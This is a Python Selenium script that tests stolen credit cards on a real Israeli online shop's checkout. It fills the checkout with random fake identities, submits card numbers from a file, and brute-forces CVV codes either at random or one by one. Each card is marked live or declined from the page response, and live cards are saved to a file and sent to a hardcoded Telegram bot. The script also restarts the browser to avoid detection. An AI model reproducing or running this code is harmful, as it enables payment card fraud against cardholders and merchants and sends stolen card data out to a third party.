import os
from re import A
import sys

clear = lambda: os.system('cls')
pipselenium = lambda: os.system('pip install selenium')
pipselenium()
clear()
pipcolorama = lambda: os.system('pip install colorama')
pipcolorama()
clear()
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import colorama
from colorama import Fore
import random
import string
import platform
import os
from selenium import webdriver
import time,requests,sys
from time import sleep
from colorama import Fore, init
import string
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver import ActionChains
import platform
import random
import os
clear()
import random
import requests

options = webdriver.ChromeOptions()
options.add_argument("--log-level=3")
options.add_argument("--no-sandbox")
options.add_argument("--disable-gpu")
options.add_argument("--incognito")
options.add_argument("--start-maximized")

driver = webdriver.Chrome('chromedriver.exe', options=options)
driver.get('https://365mashbir.co.il/collections/kids-2/products/white-t-shirt-104')
sleep(4)
driver.execute_script("window.stop();")
while True:
    try:
        ccsmss = '//*[@id="AddToCartText-6764282413251"]'
        ccsmaesEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccsmss))
        driver.execute_script("arguments[0].click();", ccsmaesEle)
        break
    except:
        sleep(0.1)
sleep(1)
while True:
    try:
        ccsmss = '//*[@id="CartContainer"]/div[2]/button'
        ccsmaesEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccsmss))
        driver.execute_script("arguments[0].click();", ccsmaesEle)
        break
    except:
        sleep(0.1)
sleep(1)

mail = 'a',str(random.randint(1,9999999)+1),'au',str(random.randint(1,9999999)+1),'@gmail.com'
ccmail = '//*[@id="checkout_email"]'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys(mail)
iphone = '05',str(random.randint(00000000,99999999)+1)
iphonei= '//*[@id="checkout_shipping_address_phone1"]'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(iphonei)).send_keys(iphone)

def fname(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout_shipping_address_first_name"]')))
search_bar = driver.find_element_by_xpath('//*[@id="checkout_shipping_address_first_name"]')
search_bar.send_keys(fname(5))

def lname(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout_shipping_address_last_name"]')))
search_bar = driver.find_element_by_xpath('//*[@id="checkout_shipping_address_last_name"]')
search_bar.send_keys(lname(5))
adders = '//*[@id="checkout_shipping_address_address1"]'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders)).send_keys('שוהם')
adders4 = '//*[@id="checkout_shipping_address_address2"]'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders4)).send_keys('שוהם')
adders3 = '//*[@id="checkout_shipping_address_city"]'
WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders3)).send_keys('9300000')

sleep(2)
while True:
    try:
        adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
        break
    except:
        sleep(0.1) 
sleep(4)
while True:
    try:
        adders5 = driver.find_element_by_xpath('//*[@id="shopify-section-checkout-popup-boa"]/div/button').click()
        break
    except:
        sleep(0.1) 

sleep(3)
while True:
    try:
        adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
        break
    except:
        sleep(0.1)
while True:
    try:
        adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
        break
    except:
        sleep(0.1)

        
loop = 0
count = 0 

sleep(1)
print(Fore.RED+'-------------------------------------------------------------------')
print(Fore.BLUE+'-1 '+Fore.YELLOW+'>>> If You Wont Use Random CCv ')
print(Fore.BLUE+'-2 '+Fore.YELLOW+'>>> If You Wont Use Ccv Step Step ')
print(Fore.BLUE+'-3 '+Fore.YELLOW+'>>> If You Wont Use Card With Ccv ')
print(Fore.BLUE+'-4 '+Fore.YELLOW+'>>> If You Wont Use One Card On File And Ccv Step Step ')
print(Fore.RED+'-------------------------------------------------------------------')
typesss = input(Fore.GREEN+"Enter You Choose : ")
loop = 0
if typesss == '1':
    x = 0
    while(x == 0):
        with open('ccrandom.txt','r') as fin:
            ccrandoms = fin.readlines()
        for ccrandom in ccrandoms:
            with open('cards.txt','r') as fin:
                cards = fin.readlines()
            for onecard in cards:
                cardNumbervlaue,expirationDateMonthvalue,expirationDateYearvalue,aasqfwgqwg = onecard.split('|')
                #ccformnum = WebDriverWait(driver, 100).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div[3]/div/div[2]/div/div/div[2]/iframe')))
                ccnum = '//*[@id="PaymentDetails_CreditCard_CardNumber"]'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccnum)).send_keys(cardNumbervlaue)
                ccexpmonth = '//*[@id="PaymentDetails_CreditCard_Expiration"]'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpmonth)).send_keys(expirationDateMonthvalue)
                ccexpyear = '//*[@id="PaymentDetails_CreditCard_Expiration"]'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpyear)).send_keys(expirationDateYearvalue)
                ccv = '//*[@id="PaymentDetails_CreditCard_CVV"]'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccv)).send_keys(ccrandom)
                idnmber = '//*[@id="PaymentDetails_CreditCard_CustomerID"]'
                WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(idnmber)).send_keys('059999789')
                sleep(2)
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="main-inner"]/form/div[3]/a'))).click()
                sleep(7)
                z = 0
                while(z == 0):
                    if "קוד 004" in driver.page_source:
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Dicline --"
                        print(Fore.RED + aa)
                        z = 99
                        sleep(2.5)
                        driver.find_element_by_xpath('//*[@id="PaymentDetails_CreditCard_CardNumber"]').send_keys(Keys.CONTROL,"a",Keys.DELETE)
                        driver.find_element_by_xpath('//*[@id="PaymentDetails_CreditCard_Expiration"]').send_keys(Keys.CONTROL,"a",Keys.DELETE)
                        driver.find_element_by_xpath('//*[@id="PaymentDetails_CreditCard_Expiration"]').send_keys(Keys.CONTROL,"a",Keys.DELETE)
                        driver.find_element_by_xpath('//*[@id="PaymentDetails_CreditCard_CVV"]').send_keys(Keys.CONTROL,"a",Keys.DELETE)
                        sleep(3)
                        loop+=1
                        if(loop==20):
                            #nordvpn()
                            sleep(5)
                            loop = 0
 

                    if "קוד 026" in driver.page_source:
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Live --"
                        print(Fore.GREEN + aa)
                        z = 99
                        with open('live.txt', 'r') as file:
                            valueoldgoodcard = file.read()
                        with open('live.txt', 'w') as f: 
                            f.write(str(valueoldgoodcard)+'\n'+str(aa))
                        telegram_bot = 'https://api.telegram.org/bot5195168928:AAEALEf4ZbV_yssNmCi7Mly7L2TneQu22cw/sendMessage?chat_id=1729689405&text=%22'+aa+'%22'
                        driver.get(telegram_bot)
                        driver.close()
                    if "SMS" in driver.page_source:
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Live --"
                        print(Fore.GREEN + aa)
                        z = 99
                        with open('live.txt', 'r') as file:
                            valueoldgoodcard = file.read()
                        with open('live.txt', 'w') as f: 
                            f.write(str(valueoldgoodcard)+'\n'+str(aa))
                        telegram_bot = 'https://api.telegram.org/bot5195168928:AAEALEf4ZbV_yssNmCi7Mly7L2TneQu22cw/sendMessage?chat_id=1729689405&text=%22'+aa+'%22'
                        driver.get(telegram_bot)


                    if "success" in driver.page_source:
                        aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + ccrandom + " -- Live --"
                        print(Fore.GREEN + aa)
                        z = 99
                        with open('live.txt', 'r') as file:
                            valueoldgoodcard = file.read()
                        with open('live.txt', 'w') as f: 
                            f.write(str(valueoldgoodcard)+'\n'+str(aa))
                        telegram_bot = 'https://api.telegram.org/bot5195168928:AAEALEf4ZbV_yssNmCi7Mly7L2TneQu22cw/sendMessage?chat_id=1729689405&text=%22'+aa+'%22'
                        driver.get(telegram_bot)

                        
                        
elif typesss == '2' or typesss == '4':
    print(Fore.RED+'-------------------------------------------------------------------')
    CCVa = int(input("Pls Enter Bigen CCV CVC CVV : "))
    CCV = CCVa
    x = 0
    while(x == 0):
        with open('cards.txt','r') as fin:
            cards = fin.readlines()
        for onecard in cards:
            cardNumbervlaue,expirationDateMonthvalue,expirationDateYearvalue,aasqfwgqwg = onecard.split('|')
            #ccformnum = WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div[1]/div/div[3]/div/main/div/div/div/div[2]/div/div/div/div[3]/div/div/div/div/div/div/div[2]/div[1]/div[2]/div/div/div/div/div/div/div[1]/div/fieldset/div/div[3]/div[2]/div/div/div/div[1]/iframe')))
            sleep(0.5)
            idnmber = '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[2]/div/div/div/input'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(idnmber)).send_keys('med slm')
            idnmber = '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[3]/div/div/div/input'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(idnmber)).send_keys('059999789')
            while True:
                try:
                    ccnum = '//*[@id="frmCCNum"]'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccnum)).send_keys(cardNumbervlaue)
                    break
                except:
                    sleep(0.1)
            sleep(0.5)
            driver.switch_to.default_content()
            while True:
                try:
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[7]/div[1]/div/div[2]/div/div/select')))
                    ccexpmonth = '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[7]/div[1]/div/div[2]/div/div/select'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpmonth)).send_keys(expirationDateMonthvalue)
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[7]/div[1]/div/div[1]/div/div/select')))
                    ccexpyear = '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[7]/div[1]/div/div[1]/div/div/select'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpyear)).send_keys(expirationDateYearvalue)
                    break
                except:
                    sleep(0.5)
   
            ccv = '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[2]/div[1]/div/div/div[7]/div[2]/div/div/input'
            CCVm = str(CCV).zfill(3)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccv)).send_keys(CCVm)
            sleep(0.5)
            
            while True:
                try:
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[3]/div/div[1]/div/div[1]/div/div/div'))).click()
                    break
                except:
                    sleep(0.1)
            while True:
                try:
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="q-app"]/div/div/div/div[1]/div[2]/div/div/form/div/div/div/div[3]/div/div[4]/button'))).click()
                    break
                except:
                    sleep(0.1)
            sleep(4)
            z = 0
            while(z == 0):
                if "סירוב" in driver.page_source:
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + CCVm + " -- Dicline --"
                    print(Fore.RED + aa)
                    count +=1
                    z = 99
                    driver.refresh()
 
                    loop = 0
                    if count == 4:
                        count = 0
                        #driver.close()
                        #driver.refresh()
                        #sleep(0.5)
                        driver.quit()
                        options = webdriver.ChromeOptions()
                        options.add_argument("--log-level=3")
                        options.add_argument("--no-sandbox")
                        options.add_argument("--disable-gpu")
                        options.add_argument("--incognito")
                        options.add_argument("--start-maximized")
                        driver = webdriver.Chrome('chromedriver.exe', options=options)
                        driver.get('https://365mashbir.co.il/collections/kids-2/products/white-t-shirt-104')
                        sleep(4)
                        driver.execute_script("window.stop();")
                        while True:
                            try:
                                ccsmss = '//*[@id="AddToCartText-6764282413251"]'
                                ccsmaesEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccsmss))
                                driver.execute_script("arguments[0].click();", ccsmaesEle)
                                break
                            except:
                                sleep(0.1)
                        sleep(1)
                        while True:
                            try:
                                ccsmss = '//*[@id="CartContainer"]/div[2]/button'
                                ccsmaesEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccsmss))
                                driver.execute_script("arguments[0].click();", ccsmaesEle)
                                break
                            except:
                                sleep(0.1)
                        sleep(1)
                        
                        mail = 'a',str(random.randint(1,9999999)+1),'au',str(random.randint(1,9999999)+1),'@gmail.com'
                        ccmail = '//*[@id="checkout_email"]'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys(mail)
                        iphone = '05',str(random.randint(00000000,99999999)+1)
                        iphonei= '//*[@id="checkout_shipping_address_phone1"]'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(iphonei)).send_keys(iphone)
                        
                        def fname(length):
                                letters = string.ascii_lowercase
                                return ''.join(random.choice(letters) for i in range(length))
                        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout_shipping_address_first_name"]')))
                        search_bar = driver.find_element_by_xpath('//*[@id="checkout_shipping_address_first_name"]')
                        search_bar.send_keys(fname(5))
                        
                        def lname(length):
                                letters = string.ascii_lowercase
                                return ''.join(random.choice(letters) for i in range(length))
                        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout_shipping_address_last_name"]')))
                        search_bar = driver.find_element_by_xpath('//*[@id="checkout_shipping_address_last_name"]')
                        search_bar.send_keys(lname(5))
                        adders = '//*[@id="checkout_shipping_address_address1"]'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders)).send_keys('שוהם')
                        adders4 = '//*[@id="checkout_shipping_address_address2"]'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders4)).send_keys('שוהם')
                        adders3 = '//*[@id="checkout_shipping_address_city"]'
                        WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders3)).send_keys('9300000')
                        
                        sleep(2)
                        while True:
                            try:
                                adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
                                break
                            except:
                                sleep(0.1) 
                        sleep(4)
                        while True:
                            try:
                                adders5 = driver.find_element_by_xpath('//*[@id="shopify-section-checkout-popup-boa"]/div/button').click()
                                break
                            except:
                                sleep(0.1) 
                        
                        sleep(3)
                        while True:
                            try:
                                adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
                                break
                            except:
                                sleep(0.1)
                        while True:
                            try:
                                adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
                                break
                            except:
                                sleep(0.1)
                        sleep(3.5)


                if "תודה" in driver.page_source:
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + CCVm + " -- Live --"
                    print(Fore.GREEN + aa)
                    z = 99
                    with open('live.txt', 'r') as file:
                        valueoldgoodcard = file.read()
                    with open('live.txt', 'w') as f: 
                        f.write(str(valueoldgoodcard)+'\n'+str(aa))



                    options = webdriver.ChromeOptions()
                    options.add_argument("--log-level=3")
                    options.add_argument("--no-sandbox")
                    options.add_argument("--disable-gpu")
                    options.add_argument("--incognito")
                    options.add_argument("--start-maximized")
                    #options.add_argument("--headless")
                    driver = webdriver.Chrome('chromedriver.exe', options=options)
                    driver.get('https://365mashbir.co.il/collections/kids-2/products/white-t-shirt-104')
                    sleep(4)
                    driver.execute_script("window.stop();")
                    while True:
                        try:
                            ccsmss = '//*[@id="AddToCartText-6764282413251"]'
                            ccsmaesEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccsmss))
                            driver.execute_script("arguments[0].click();", ccsmaesEle)
                            break
                        except:
                            sleep(0.1)
                    sleep(1)
                    while True:
                        try:
                            ccsmss = '//*[@id="CartContainer"]/div[2]/button'
                            ccsmaesEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccsmss))
                            driver.execute_script("arguments[0].click();", ccsmaesEle)
                            break
                        except:
                            sleep(0.1)
                    sleep(1)
                    
                    mail = 'a',str(random.randint(1,9999999)+1),'au',str(random.randint(1,9999999)+1),'@gmail.com'
                    ccmail = '//*[@id="checkout_email"]'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccmail)).send_keys(mail)
                    iphone = '05',str(random.randint(00000000,99999999)+1)
                    iphonei= '//*[@id="checkout_shipping_address_phone1"]'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(iphonei)).send_keys(iphone)
                    
                    def fname(length):
                            letters = string.ascii_lowercase
                            return ''.join(random.choice(letters) for i in range(length))
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout_shipping_address_first_name"]')))
                    search_bar = driver.find_element_by_xpath('//*[@id="checkout_shipping_address_first_name"]')
                    search_bar.send_keys(fname(5))
                    
                    def lname(length):
                            letters = string.ascii_lowercase
                            return ''.join(random.choice(letters) for i in range(length))
                    WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="checkout_shipping_address_last_name"]')))
                    search_bar = driver.find_element_by_xpath('//*[@id="checkout_shipping_address_last_name"]')
                    search_bar.send_keys(lname(5))
                    adders = '//*[@id="checkout_shipping_address_address1"]'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders)).send_keys('שוהם')
                    adders4 = '//*[@id="checkout_shipping_address_address2"]'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders4)).send_keys('שוהם')
                    adders3 = '//*[@id="checkout_shipping_address_city"]'
                    WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(adders3)).send_keys('9300000')
                    
                    sleep(2)
                    while True:
                        try:
                            adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
                            break
                        except:
                            sleep(0.1) 
                    sleep(4)
                    while True:
                        try:
                            adders5 = driver.find_element_by_xpath('//*[@id="shopify-section-checkout-popup-boa"]/div/button').click()
                            break
                        except:
                            sleep(0.1) 
                    
                    #.....  
                    sleep(3)
                    while True:
                        try:
                            adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
                            break
                        except:
                            sleep(0.1)
                    while True:
                        try:
                            adders5 = driver.find_element_by_xpath('//*[@id="continue_button"]').click()
                            break
                        except:
                            sleep(0.1)
                    sleep(1)
        CCV += 1
elif typesss == '3':
    print(Fore.RED+'-------------------------------------------------------------------')   
    x = 0
    while(x == 0):
        with open('cards.txt','r') as fin:
            cards = fin.readlines()
        for onecard in cards:
            cardNumbervlaue,expirationDateMonthvalue,expirationDateYearvalue,aasqfwgqwg,wwwwwwwwwwwww = onecard.split('|')
            driver.switch_to.default_content()
            ccformnum = WebDriverWait(driver, 100).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div/div[2]/div/div/div/div/article/div/div/div/form/div/ul/li/div/fieldset/div/div[1]/iframe')))
            sleep(2)
            ccnum = '/html[1]/body[1]/form[1]/input[1]'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccnum)).send_keys(cardNumbervlaue)
            driver.switch_to.default_content()
            ccformnum = WebDriverWait(driver, 100).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div/div[2]/div/div/div/div/article/div/div/div/form/div/ul/li/div/fieldset/div/div[2]/iframe')))
            ccexpmonth = '/html[1]/body[1]/form[1]/input[1]'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpmonth)).send_keys(expirationDateMonthvalue)
            
            ccexpyear = '/html[1]/body[1]/form[1]/input[1]'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccexpyear)).send_keys(expirationDateYearvalue)
            driver.switch_to.default_content()

            ccformnum = WebDriverWait(driver, 100).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div/div[2]/div/div/div/div/article/div/div/div/form/div/ul/li/div/fieldset/div/div[3]/iframe')))
            ccv = '/html[1]/body[1]/form[1]/input[1]'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccv)).send_keys(aasqfwgqwg)
            driver.switch_to.default_content()
            ccformnum = WebDriverWait(driver, 100).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div/div[2]/div/div/div/div/article/div/div/div/form/div/ul/li/div/fieldset/div/div[4]/iframe')))
            name = '/html[1]/body[1]/form[1]/input[1]'
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(name)).send_keys('90002')
            
            sleep(2)
            driver.switch_to.default_content()

            ccbtnaddcard = '//*[@id="place_order"]'
            ccbtnaddcardEle = WebDriverWait(driver, 20).until(lambda driver: driver.find_element_by_xpath(ccbtnaddcard))
            driver.execute_script("arguments[0].click();", ccbtnaddcardEle)
            z = 0
            sleep(5)
            while(z == 0):
                if "Status code INVALID_CARD_DATA: Invalid card data." in driver.page_source:
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + aasqfwgqwg + " -- Dicline --"
                    print(Fore.RED + aa)
                    z = 99
                    sleep(3)
                    driver.refresh()
                    sleep(7)
                    driver.execute_script("window.stop();")
                    sleep(12)
                    loop+=1
                    if(loop==7):
                        driver.close()
                        #nordvpn()
                        driver.quit()
                        loop = 0



                if "Nice!" in driver.page_source:
                    aa = cardNumbervlaue + "|" + expirationDateMonthvalue + "|" + expirationDateYearvalue + "|" + aasqfwgqwg + " -- Live --"
                    print(Fore.GREEN + aa)
                    z = 99
                    with open('live.txt', 'r') as file:
                        valueoldgoodcard = file.read()
                    with open('live.txt', 'w') as f: 
                        f.write(str(valueoldgoodcard)+'\n'+str(aa))
                    #os.startfile('beep.mp3')
                    driver.close()
                    #nordvpn()
                    driver.quit()
